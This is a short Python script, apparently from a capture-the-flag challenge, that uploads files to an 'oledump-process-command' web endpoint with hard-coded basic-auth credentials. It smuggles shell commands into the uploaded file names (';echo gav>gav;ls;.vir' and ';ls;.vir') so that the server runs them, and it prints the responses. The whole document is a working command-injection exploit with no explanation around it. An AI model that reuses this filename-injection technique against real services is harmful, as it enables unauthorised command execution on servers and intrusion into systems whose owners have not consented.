import requests
import base64
password = "you'll be needing this one!" 
auth = base64.b64encode('user:' + password)
gav = {'file': (';echo gav>gav;ls;.vir', open('input0.txt', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
catr = {'file': (';ls;.vir', open('input0.txt', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
res =  requests.post('http://d1d13r.stillhackinganyway.nl:9001/oledump-process-command', 
    files = gav, headers = {'Authorization': 'Basic ' + auth})
print res.text

print "OK, NEXT"

res =  requests.post('http://d1d13r.stillhackinganyway.nl:9001/oledump-process-command', 
    files = catr, headers = {'Authorization': 'Basic ' + auth})
print res.text